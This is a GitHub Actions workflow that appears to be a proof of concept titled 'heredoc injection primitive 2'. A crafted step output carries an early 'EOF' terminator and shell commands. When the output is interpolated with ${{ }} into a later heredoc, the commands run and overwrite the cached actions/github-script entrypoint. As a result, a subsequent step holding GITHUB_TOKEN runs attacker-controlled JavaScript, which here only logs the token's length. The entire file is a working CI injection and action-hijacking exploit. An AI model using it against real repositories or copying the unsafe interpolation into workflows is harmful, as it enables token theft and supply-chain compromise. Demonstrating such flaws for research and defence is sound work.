name: heredoc injection primitive 2
on: workflow_dispatch
permissions:
  contents: read
jobs:
  t:
    runs-on: ubuntu-latest
    steps:
      - id: dependency-review
        run: |
          {
            echo 'comment-content<<__EOOUT__'
            echo '<table><tr><td><a href="https://x/">pkg'
            echo 'EOF'
            echo 'echo "[*] shell injection as $(id -un)"'
            echo 'ls -d /home/runner/work/_actions/*/*/* 2>/dev/null | head -5'
            echo 'D=$(find /home/runner/work/_actions -path "*github-script*/action.yml" 2>/dev/null | head -1 | xargs dirname)'
            echo 'echo "[*] target action dir: $D"'
            echo 'printf "%s\n" "console.log(\"[!] attacker entrypoint ran; INPUT_GITHUB_TOKEN length=\" + (process.env.INPUT_GITHUB_TOKEN||\"\").length);" > "$D/dist/index.js"'
            echo ": <<'EOF'"
            echo '</a></td></tr></table>'
            echo '__EOOUT__'
          } >> "$GITHUB_OUTPUT"
      - name: Save dependency review output report
        if: ${{ steps.dependency-review.outputs.comment-content != null }}
        run: |
          cat << 'EOF' > openssf-report.html
          ${{ steps.dependency-review.outputs.comment-content }}
          EOF
          echo done
      - name: Downstream JS action holding a token
        uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            console.log('legit action body ran');
